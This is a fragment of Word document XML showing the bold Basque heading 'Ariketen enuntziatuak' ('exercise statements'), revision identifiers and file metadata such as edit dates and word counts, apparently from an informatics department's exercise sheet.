    <w:proofErr w:type="spellStart"/>
    <w:r w:rsidRPr="00191397">
      <w:rPr>
        <w:b/>
      </w:rPr>
      <w:t>Ariketen</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
    <w:r w:rsidRPr="00191397">
      <w:rPr>
        <w:b/>
      </w:rPr>
      <w:t xml:space="preserve"> </w:t>
    </w:r>
    <w:proofErr w:type="spellStart"/>
    <w:r w:rsidRPr="00191397">
      <w:rPr>
        <w:b/>
      </w:rPr>
      <w:t>enuntziatuak</w:t>
    </w:r>
    <w:proofErr w:type="spellEnd"/>
  </w:p>
  <w:p w:rsidR="00187FDE" w:rsidRDefault="00187F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D41"/>
    <w:rsid w:val="00034616"/>
    <w:rsid w:val="0006063C"/>
    <w:rsid w:val="0015074B"/>
    <w:rsid w:val="00187FDE"/>
    <w:rsid w:val="0029639D"/>
    <w:rsid w:val="00326F90"/>
    <w:rsid w:val="003749A9"/>
    <w:rsid w:val="003B6899"/>
    <w:rsid w:val="00467B11"/>
    <w:rsid w:val="005142B7"/>
    <w:rsid w:val="005318DC"/>
    <w:rsid w:val="008B099E"/>
    <w:rsid w:val="0090639E"/>
    <w:rsid w:val="00AA1D8D"/>
    <w:rsid w:val="00B47730"/>
    <w:rsid w:val="00BB0425"/>
    <w:rsid w:val="00C81428"/>
    <w:rsid w:val="00CB0664"/>
    <w:rsid w:val="00DF4682"/>
    <w:rsid w:val="00E35B12"/>
    <w:rsid w:val="00F60D3B"/>
    <w:rsid w:val="00FA4EBE"/>
    <w:rsid w:val="00FC693F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69DD3F"/>
  <w14:defaultImageDpi w14:val="300"/>
  <w15:docId w15:val="{1DBD5B7C-FA9D-4DE2-BF6E-C40E18F7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  <w:rPr>
      <w:sz w:val="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20CDD-2FA2-4B7D-862E-A55EF9C4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819</Words>
  <Characters>4507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DPTO.INF</cp:lastModifiedBy>
  <cp:revision>8</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2013-12-23T23:15:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2023-06-29T12:19:00Z</dcterms:modified>
  <cp:category/>
</cp:coreProperties>
</file>